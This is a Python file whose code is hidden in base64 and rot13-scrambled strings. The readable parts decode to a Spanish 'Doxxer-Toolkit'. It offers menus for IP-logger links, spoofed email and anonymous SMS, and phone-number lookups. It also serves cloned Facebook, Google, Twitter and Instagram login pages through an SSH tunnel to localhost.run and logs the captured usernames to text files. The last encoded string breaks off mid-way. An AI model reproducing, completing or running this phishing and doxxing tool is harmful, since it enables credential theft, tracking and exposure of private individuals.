import base64, codecs
magic = 'aW1wb3J0IG9zDQppbXBvcnQgdGltZQ0KaW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCByYW5kb20NCmltcG9ydCBwaG9uZW51bWJlcnMNCmZyb20gcGhvbmVudW1iZXJzIGltcG9ydCBnZW9jb2RlciwgY2FycmllciwgdGltZXpvbmUNCmltcG9ydCBxcmNvZGUNCmltcG9ydCBQSUwNCmZyb20gZmFrZXIgaW1wb3J0IEZha2VyDQpmcm9tIGxvbCBpbXBvcnQgUGhvbmVEb3gNCmltcG9ydCB3ZWJicm93c2VyDQpmcm9tIHBsYXRmb3JtIGltcG9ydCBzeXN0ZW0NCg0KDQpjbGFzcyBDb2xvcmVzOg0KICByZWQ9IlwwMzNbMzE7MW0iDQogIHZlcmRlPSJcMDMzWzkybSINCiAgYXp1bD0iXDAzM1s5NG0iDQogIG1hZ2VudGE9IlwwMzNbMzZtIg0KICANCm9zLnN5c3RlbSgia2lsbGFsbCBwaHAiKQ0Kb3Muc3lzdGVtKCJjbGVhciIpDQpyYW5kb21jb2xvcj1bQ29sb3Jlcy5yZWQsQ29sb3Jlcy52ZXJkZSxDb2xvcmVzLmF6dWwsQ29sb3Jlcy5tYWdlbnRhXQ0KI3JhbmRvbS5zaHVmZmxlKHJhbmRvbWNvbG9yKQ0KbG9nbyA9IENvbG9yZXMucmVkICsgJycnDQrCt+KWhOKWhOKWhOKWhCAgICAgICAg4paQ4paE4oCiIOKWhCDilpDiloTigKIg4paEIOKWhOKWhOKWhCAu4paE4paE4paEICAgICAg4paE4paE4paE4paE4paEICAgICAgICAgICAg4paE4paE4paMICDiloQg4oCi4paEIOKWqiAg4paE4paE4paE4paE4paEDQrilojilojilqog4paI4paIIOKWqiAgICAgIOKWiOKWjOKWiOKWjOKWqiDilojilozilojilozilqriloDiloQu4paAwrfiloDiloQg4paIwrcgICAg4oCi4paI4paIICDilqogICAgIOKWqiAgICAg4paI4paI4oCiICDilojiloziloTilozilqrilojilogg4oCi4paI4paIICANCuKWkOKWiMK3IOKWkOKWiOKWjCDiloTilojiloDiloQgIMK34paI4paIwrcgIMK34paI4paIwrcg4paQ4paA4paA4paq4paE4paQ4paA4paA4paEICAgICAg4paQ4paILuKWqiDiloTilojiloDiloQgIOKWhOKWiOKWgOKWhCDilojilojilqogIOKWkOKWgOKWgOKWhMK34paQ4paIwrcg4paQ4paILuKWqg0K4paI4paILiDilojilogg4paQ4paI4paMLuKWkOKWjOKWquKWkOKWiMK34paI4paM4paq4paQ4paIwrfilojilozilpDilojiloTiloTilozilpDilojigKLilojilowgICAgIOKWkOKWiOKWjMK34paQ4paI4paMLuKWkOKWjOKWkOKWiOKWjC7ilpDilozilpDilojilozilpDilozilpDilogu4paI4paM4paQ4paI4paMIOKWkOKWiOKWjMK3DQriloDiloDiloDiloDiloDigKIgIOKWgOKWiOKWhOKWgOKWquKAouKWgOKWgCDiloDiloDigKLiloDiloAg4paA4paAIOKWgOKWgOKWgCAu4paAICDiloAgICAgIOKWgOKWgOKWgCAg4paA4paI4paE4paA4paqIOKWgOKWiOKWhOKWgOKWqi7iloDiloDiloAgwrfiloAgIOKWgOKWgOKWgOKWgCDiloDiloDiloAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIEJ5OiAgRXVyb255bW91NQ0KICAgICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX18NCicnJw0KDQpkZWYgc2hlcigpOg0KICBwcmludCgnXG5bMV0gQWJyaXIgbGluayBwYXJhIGxpbnV4JykNCiAgcHJpbnQoJ1xuWzJdIEFicmlyIGxpbmsgcGFyYSB0ZXJtdXgnKQ0KICBlbGVqaXIyMyA9IGludChpbnB1dCgnW35dIFNlbGVjY2lvbmEgdW5hIG9wY2lvbjogJykpDQogIGlmIGVsZWppcjIzID09IDE6DQogICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL25hbWVjaGsuY29tLycpDQogICAgc2hlcigpDQogIGVsaWYgZWxlamlyMjMgPT0gMjoNCiAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vbmFtZWNoay5jb20vIikNCiAgICBzaGVyKCkNCiAgZWxzZToNCiAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIHNoZXIoKQ0KICAgIA0KZGVmIGlwbG9nKCk6DQogIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICBwcmludChsb2dvKQ0KICBwcmludCgnXG5bfl0gSW5ncmVzYSB1bmEgb3BjaW9uLicpDQogIHByaW50KCcnJ1xuDQogIFsxXSBJUGxvZ2dlci5vcmcNCiAgDQogIFsyXSBHcmFiaWZ5DQogIA0KICBbM10gQ3JlYXIgdW4gbGluayBJUGxvZ2dlciANCiAgDQogIFswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwNCiAgDQogIFs5OV0gU2FsaXINCiAgJycnKQ0KICBvcGMgPSBpbnQoaW5wdXQoJ1t+XSBFbGlqZSB1bmEgb3BjaW9uOiAnKSkNCiAgaWYgb3BjID09IDE6DQogICAgcHJpbnQoJ1xuWzFdIEFicmlyIGxpbmsgcGFyYSBsaW51eCcpDQogICAgcHJpbnQoJ1xuWzJdIEFicmlyIGxpbmsgcGFyYSB0ZXJtdXgnKQ0KICAgIHByaW50KCdcblswMF0gUmVncmVzYXIgYWwgbWVudSBhbnRlcmlvcicpDQogICAgcHJpbnQoJ1xuWzk5XSBTYWxpcicpDQogICAgU2tkID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpDQogICAgaWYgU2tkID09IDE6DQogICAgICB3ZWJicm93c2VyLm9wZW4oJ2h0dHBzOi8vaXBsb2dnZXIub3JnL2VzLycpDQogICAgZWxpZiBTa2QgPT0gMjoNCiAgICAgIG9zLnN5c3RlbSgidGVybXV4LW9wZW4gaHR0cHM6Ly9pcGxvZ2dlci5vcmcvZXMvIikNCiAgICAgIGlwbG9nKCkNCiAgICBlbGlmIFNrZCA9PSAwMDoNCiAgICAgIGlwbG9nKCkNCiAgICBlbGlmIFNrZCA9PSA5OToNCiAgICAgIGV4aXQoKQ0KICAgIGVsc2U6DQogICAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQ0KICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgaXBsb2coKQ0KICBlbGlmIG9wYyA9PSAyOg0KICAgIHByaW50KCdcblsxXSBBYnJpciBsaW5rIHBhcmEgbGludXgnKQ0KICAgIHByaW50KCdcblsyXSBBYnJpciBsaW5rIHBhcmEgdGVybXV4JykNCiAgICBwcmludCgnXG5bMDBdIFJlZ3Jlc2FyIGFsIG1lbnUgYW50ZXJpb3InKQ0KICAgIHByaW50KCdcbls5OV0gU2FsaXInKQ0KICAgIExBID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpDQogICAgaWYgTEEgPT0gMToNCiAgICAgIHdlYmJyb3dzZXIub3BlbignaHR0cHM6Ly9ncmFiaWZ5LmxpbmsvJykNCiAgICBlbGlmIExBID09IDI6DQogICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vZ3JhYmlmeS5saW5rLyIpDQogICAgICBpcGxvZygpDQogICAgZWxpZiBMQSA9PSAwMDoNCiAgICAgIGlwbG9nKCkNCiAgICBlbGlmIExBID09IDk5Og0KICAgICAgZXhpdCgpDQogICAgZWxzZToNCiAgICAgIHByaW50KCdbfl0gRXJyb3Igb3BjaW9uIGludmFsaWRhLicpDQogICAgICB0aW1lLnNsZWVwKDIpDQogICAgICBpcGxvZygpDQogIGVsaWYgb3BjID09IDM6DQogICAgcHJpbnQoJ1xuW35dIExhcyBJUCBzZSBndWFyZGFyYW4gZW4gRG94eGVyLVRvb2xraXQvLnBhZ2VzL0lQbG9nZ2VyL2lwLnR4dCcpDQogICAgcHJpbnQoJ1xuW35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQ0KICAgIHByaW50KCcgJykNCiAgICBjbWQgPSAicGhwIC10IC5wYWdlcy9JUGxvZ2dlciAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAt'
love = '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'
god = 'cmludCgnXG5bOTldIFNhbGlyJykNCiAgICBicnVoID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpDQogICAgaWYgYnJ1aCA9PSAxOg0KICAgICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL2Vta2VpLmN6LycpDQogICAgZWxpZiBicnVoID09IDI6DQogICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vZW1rZWkuY3ovIikNCiAgICBlbGlmIGJydWggPT0gMDA6DQogICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgIHByaW50KGxvZ28pDQogICAgICBlbWFpbGZhaygpDQogICAgZWxpZiBicnVoID09IDk5Og0KICAgICAgZXhpdCgpDQogICAgZWxzZToNCiAgICAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQ0KICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICBwcmludChsb2dvKQ0KICAgICAgIGVtYWlsZmFrKCkNCiAgZWxpZiBPUCA9PSAwMDoNCiAgICBtZW51KCkNCiAgZWxpZiBPUCA9PSA5OToNCiAgICBleGl0KCkNCiAgZWxzZToNCiAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQ0KICAgIHRpbWUuc2xlZXAoMikNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIGVtYWlsZmFrKCkNCiAgDQpkZWYgcGhpc2hpbmcoKToNCiAgcHJpbnQoJ1xuW35dIFNlbGVjY2lvbmEgdW5hIG9wY2lvbicpDQogIHByaW50KCcnJw0KICBbMV0gRmFjZWJvb2sNCiAgDQogIFsyXSBHb29nbGUNCiAgDQogIFszXSBUd2l0dGVyDQogIA0KICBbNF0gSW5zdGFncmFtDQogIA0KICBbMDBdIFJlZ3Jlc2FyIGFsIG1lbnUgcHJpbmNpcGFsDQogIA0KICBbOTldIFNhbGlyDQogICcnJykNCiAgWVAgPSBpbnQoaW5wdXQoJ1t+XSBFbGlqZSB1bmEgb3BjaW9uOiAnKSkNCiAgaWYgWVAgPT0gMToNCiAgICBwcmludCgnXG5bfl0gTG9zIHVzdWFyaW9zIHNlIGd1YXJkYXJhbiBlbiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0JykNCiAgICBwcmludCgnXG5bfl0gTG9zIHB1ZWRlcyB2ZXIgaGFjaWVuZG8gdW4gY2F0IERveHhlci1Ub29sa2l0Ly5wYWdlcy9GYWNlYm9vay91c3Vhcmlvcy50eHQnKQ0KICAgIHByaW50KCdcblt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykNCiAgICBwcmludCgnICcpDQogICAgY21kID0gInBocCAtdCAucGFnZXMvRmFjZWJvb2sgLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biINCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpDQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQ0KICBlbGlmIFlQID09IDI6DQogICAgcHJpbnQoJ1xuW35dIExvcyB1c3VhcmlvcyBzZSBndWFyZGFyYW4gZW4gRG94eGVyLVRvb2xraXQvLnBhZ2VzL0dvb2dsZS91c3Vhcmlvcy50eHQnKQ0KICAgIHByaW50KCdcblt+XSBMb3MgcHVlZGVzIHZlciBoYWNpZW5kbyB1biBjYXQgRG94eGVyLVRvb2xraXQvLnBhZ2VzL0dvb2dsZS91c3Vhcmlvcy50eHQnKQ0KICAgIHByaW50KCdcblt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykNCiAgICBwcmludCgnICcpDQogICAgY21kID0gInBocCAtdCAucGFnZXMvR29vZ2xlIC1TIGxvY2FsaG9zdDo4MDgwICYgc3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4iDQogICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oY21kLCBzaGVsbD1UcnVlKQ0KICAgIGEgPSBwLmNvbW11bmljYXRlKClbMF0NCiAgZWxpZiBZUCA9PSAzOg0KICAgIHByaW50KCdcblt+XSBMb3MgdXN1YXJpb3Mgc2UgZ3VhcmRhcmFuIGVuIERveHhlci1Ub29sa2l0Ly5wYWdlcy9Ud2l0dGVyL3VzdWFyaW9zLnR4dCcpDQogICAgcHJpbnQoJ1xuW35dIExvcyBwdWVkZXMgdmVyIGhhY2llbmRvIHVuIGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvVHdpdHRlci91c3Vhcmlvcy50eHQnKQ0KICAgIHByaW50KCdcblt+XSBQYXJhIHNhbGlyIHByZXNpb25hIENUUkwgKyBDJykNCiAgICBwcmludCgnICcpDQogICAgY21kID0gInBocCAtdCAucGFnZXMvVHdpdHRlciAtUyBsb2NhbGhvc3Q6ODA4MCAmIHNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIg0KICAgIHAgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSkNCiAgICBhID0gcC5jb21tdW5pY2F0ZSgpWzBdDQogIGVsaWYgWVAgPT0gNDoNCiAgICBwcmludCgnXG5bfl0gTG9zIHVzdWFyaW9zIHNlIGd1YXJkYXJhbiBlbiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvSW5zdGFncmFtL3VzdWFyaW9zLnR4dCcpDQogICAgcHJpbnQoJ1xuW35dIExvcyBwdWVkZXMgdmVyIGhhY2llbmRvIHVuIGNhdCBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvSW5zdGFncmFtL3VzdWFyaW9zLnR4dCcpDQogICAgcHJpbnQoJ1xuW35dIFBhcmEgc2FsaXIgcHJlc2lvbmEgQ1RSTCArIEMnKQ0KICAgIHByaW50KCcgJykNCiAgICBjbWQgPSAicGhwIC10IC5wYWdlcy9JbnN0YWdyYW0gLVMgbG9jYWxob3N0OjgwODAgJiBzc2ggLVIgODA6bG9jYWxob3N0OjgwODAgbm9rZXlAbG9jYWxob3N0LnJ1biINCiAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUpDQogICAgYSA9IHAuY29tbXVuaWNhdGUoKVswXQ0KICBlbGlmIFlQID09IDAwOg0KICAgIG1lbnUoKQ0KICBlbGlmIFlQID09IDk5Og0KICAgIGV4aXQoKQ0KICANCmRlZiBzbXMoKToNCiAgcHJpbnQoJ1xuWzFdIEFicmlyIHBhcmEgbGluayBwYXJhIGxpbnV4JykNCiAgcHJpbnQoJ1xuWzJdIEFicmlyIHBhcmEgdGVybXV4JykNCiAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpDQogIHByaW50KCdcbls5OV0gU2FsaXInKQ0KICBZUiA9IGludChpbnB1dCgnW35dIEVsaWplIHVuYSBvcGNpb246ICcpKQ0KICBpZiBZUiA9PSAxOg0KICAgIHdlYmJyb3dzZXIub3BlbignaHR0cDovL3d3dy5zZW5kYW5vbnltb3Vzc21zLmNvbS8nKQ0KICBlbGlmIFlSID09IDI6DQogICAgb3Muc3lzdGVtKCJ0ZXJtdXgtb3BlbiBodHRwOi8vd3d3LnNlbmRhbm9ueW1vdXNzbXMuY29tLyIpDQogIGVsaWYgWVIgPT0gMDA6DQogICAgbWVudSgpDQogIGVsaWYgWVIgPT0gOTk6DQogICAgZXhpdCgpDQogICAgDQpkZWYgbnVtZXJvKCk6DQogICAgcHJpbnQoJ1xuW35dIEZvcm1hdG86IEPDs2RpZ28gZGUgcGHDrXMgKyBOdW1lcm8nKQ0KICAgIHByaW50KCdbfl0gRWplbXBsbzogKzE5MDg3NjU0MzIxJykNCiAgICBwaG9uZV9udW1iZXIgPSBzdHIoaW5wdXQoJ1t+XSBJbmdyZXNhIGVsIG51bWVybyBkZSB0ZWxlZm9ubzogJykpDQogICAgcGhvbmVfbnVtYmVyID0gJycuam9pbihwaG9uZV9udW1iZXIuc3BsaXQoKSkNCiAgICBwaG9uZWRveCA9IFBob25lRG94KHBob25lX251bWJlcikNCiAgICBwcmludChmJ1t+XSBPYnRlbmllbmRvIGluZm9ybWFjacOzbiBkZSB7cGhvbmVfbnVtYmVyfScpDQogICAgcGhvbmVkb3guc2ltcGxlX3NjYW4oKQ0K'
destiny = 'VPNtVUOlnJ50XPqosy0tEKAwLJ5yolOwo21joTI0olpcQDbAPzEyMvOkpzAiMTyaoltcBt0XVPOjpzyhqPtaKT5osy0tFJ5apzImLFO1ovO0MKu0olOiVUIloPOjLKWuVTAioaMypaEcpvOuVTAiMTyaolOkpvpcQDbtVUOlnJ50XPqosy0tGTRtnJ1uM2IhVUAyVTq1LKWxLKWuVTAioJ86VUSlYaOhMlpcQDbtVUOlnJ50XTLar0AioT9lMKZhLKc1oU1osy0tDKEyozAco24tp2xtMKucp3EyVUIhLFOcoJSaMJ4tMTIhqUWiVTEyoPOxnKWyL3EipzyiVTEyVREirUuypv1Ho29fn2y0VTAiovOyoPOho21vpzHtpKVhpT5aVTImqTRtnJ1uM2IhVUAyVUMuVTRtpzIyoKOfLKcupvpcQDbtVUEyrUEiVQ0tnJ5jqKDbMvq7D29fo3Wypl5lMJE9J35qVRyhM3Wyp2RtqJ4tqTI4qT86VPpcQDbtVTyzVT9mYaOuqTthnKAznJkyXPWRo3u4MKVgIT9ioTgcqP9kpv5jozpvXGbAPvNtVPOipl5mrKA0MJ0bVaWgVREirUuypv1Ho29fn2y0Y3SlYaOhMlVcQDbtVPNtnJ1aVQ0tpKWwo2EyYz1un2HbMvq7qTI4qT99WlxAPvNtVPO0rKOyXTygMlxAPvNtVPOcoJphp2S2MFtvL29xnJqiYaOhMlVcQDbtVPNtpUWcoaDbW1g+KFOQo2EcM28tM2IhMKWuMT8tL29hVTI4nKEiVFpcQDbtVPNtqTygMF5moTIypPtlXD0XVPNtVT1yoaHbXD0XVPOyoUAyBt0XVPNtVTygMlN9VUSlL29xMF5gLJgyXTLar3EyrUEisFpcQDbtVPNtqUyjMFucoJpcQDbtVPNtnJ1aYaAuqzHbVaSlYaOhMlVcQDbtVPNtpUWcoaDbW1g+KFOQo2EcM28tM2IhMKWuMT8tL29hVTI4nKEiVFpcQDbtVPNtqTygMF5moTIypPtlXD0XVPNtVT1yoaHbXD0XQDcxMJLto3AcoaEjLFtcBt0XVPOipl5mrKA0MJ0bVzAfMJSlVvxAPvNtpUWcoaDboT9aolxAPvNtpUWcoaDbWlpaKT4APvNtJmSqVT9mnJ50MaWuoJI3o3WeQDbtVN0XVPOoZy0to3AcoaDtqTIwnT5cpKIypj0XVPNAPvNtJmNjKFOFMJqlMKAupvOuoPOgMJ51VUOlnJ5wnKOuoN0XVPNAPvNtJmx5KFOGLJkcpt0XVPNaWlpcQDbtVT9mnJ50VQ0tnJ50XTyhpUI0XPqosy0tEKAwpzyvMFO1ovOhqJ1ypz86VPpcXD0XVPOcMvOip2yhqPN9CFNkBt0XVPNtVUOlnJ50XPqpoyfkKFOOLaWcpvOfnJ5eVUOupzRtoTyhqKtaXD0XVPNtVUOlnJ50XPqpoyflKFOOLaWcpvOfnJ5eVUOupzRtqTIloKI4WlxAPvNtVPOjpzyhqPtaKT5oZQOqVSWyM3Wyp2SlVTSfVT1yoaHtpUWcozAcpTSfWlxAPvNtVPOjpzyhqPtaKT5oBGyqVSAuoTylWlxAPvNtVPOyoTIdnKV5BFN9VTyhqPucoaO1qPtaJ35qVRImL3WcLzHtqJ4toaIgMKWiBvNaXFxAPvNtVPOcMvOyoTIdnKV5BFN9CFNkBt0XVPNtVPNtq2IvLaWiq3Aypv5ipTIhXPqbqUEjpmbiY29mnJ50MaWuoJI3o3WeYzAioF8aXD0XVPNtVPNto3AcoaEjLFtcQDbtVPNtMJkcMvOyoTIdnKV5BFN9CFNlBt0XVPNtVPNto3Zhp3ymqTIgXPW0MKW